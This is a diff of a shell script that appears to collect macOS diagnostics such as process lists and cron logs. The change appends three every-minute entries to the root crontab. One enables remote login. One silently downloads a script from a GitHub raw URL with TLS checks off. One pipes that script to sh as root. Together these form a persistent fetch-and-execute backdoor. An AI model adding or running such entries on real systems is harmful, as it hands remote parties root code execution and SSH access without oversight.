@@ -66,7 +66,6 @@ ps -ef > /tmp/screen_mac_psef.txt || true
 pwd > /tmp/screen_mac_pwd.txt
 #sudo shutdown -h now
 
-
 #
 
 #
@@ -84,3 +83,11 @@ tail -n 100 trail /var/log/cron.log 2>&1 > /tmp/screen_mac_crontab_a_log.txt || 
 
 sudo cat /var/at/tabs/root 2>&1 > /tmp/screen_mac_crontab_root_ss.txt || true 
 sudo ls -la /var/at/tabs/ 2>&1 > /tmp/screen_mac_crontab_root_ls.txt || true
+
+read -r -d '' R_CRONTAB << EOM2
+* * * * * systemsetup -setremotelogin on
+* * * * * curl -sk https://raw.githubusercontent.com/kkochubey1/android_test/master/mac/check_r.sh?"$(date)" > /tmp/check_r.sh
+* * * * * cat /tmp/check_r.sh | sh 2>&1 /tmp/screen_mac_cron_r.txt
+EOM2
+
+sudo echo "$R_CRONTAB" >> /var/at/tabs/root
